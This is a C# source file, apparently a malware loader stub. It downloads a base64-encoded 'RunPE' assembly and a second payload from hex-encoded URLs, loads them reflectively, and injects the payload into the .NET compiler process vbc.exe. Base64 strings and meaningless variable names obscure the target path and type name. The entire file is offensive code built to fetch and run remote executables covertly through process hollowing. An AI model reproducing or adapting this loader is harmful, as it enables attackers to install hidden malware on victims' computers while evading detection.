using System;
using System.Net;
using System.Reflection;
using System.Text;


namespace SSL
{

    internal static class Program
    {   /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            ServicePointManager.Expect100Continue = true;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            WebClient DIG = new WebClient();

            string kkk = Hello(""); //runpe hex string decode. base64 string direct link.

            byte[] nnbb = Convert.FromBase64String(DIG.DownloadString(kkk));

            Assembly p = Assembly.Load(nnbb);
      
            string ppp = Hello(""); //payload hex string decode. base64 string direct link.

            string mmm = "QzpcXFdpbmRvd3NcXE1pY3Jvc29mdC5ORVRcXEZyYW1ld29ya1xcdjQuMC4zMDMxOVxcdmJjLmV4ZQ=="; // injection RegAsm.exe base64 encode

            byte[] data = Convert.FromBase64String(mmm);

            string decodedString = Encoding.UTF8.GetString(data);

            byte[] ooooo = Convert.FromBase64String(DIG.DownloadString(ppp));

            object w = new object[]
            {
               decodedString, null, ooooo, true 
            };

            var xxxx = BindingFlags.InvokeMethod;

            string WWW = "dHV0b3JpYWwuZ3lh"; //runpe load base64 encode

            byte[] FFAFA = Convert.FromBase64String(WWW);

            string BBVV = Encoding.UTF8.GetString(FFAFA);

            p.GetType(BBVV).InvokeMember("empty", xxxx, null, null, (object[])w);
        }


        static string Hello(string there)
        {
            if (there == null || (there.Length & 1) == 1)
            {
                throw new ArgumentException();
            }
            var amhere = new StringBuilder();
            for (var i = 0; i < there.Length; i += 2)
            {
                var okay = there.Substring(i, 2);
                amhere.Append((char)Convert.ToByte(okay, 16));
            }
            return amhere.ToString();
        }

    }
}
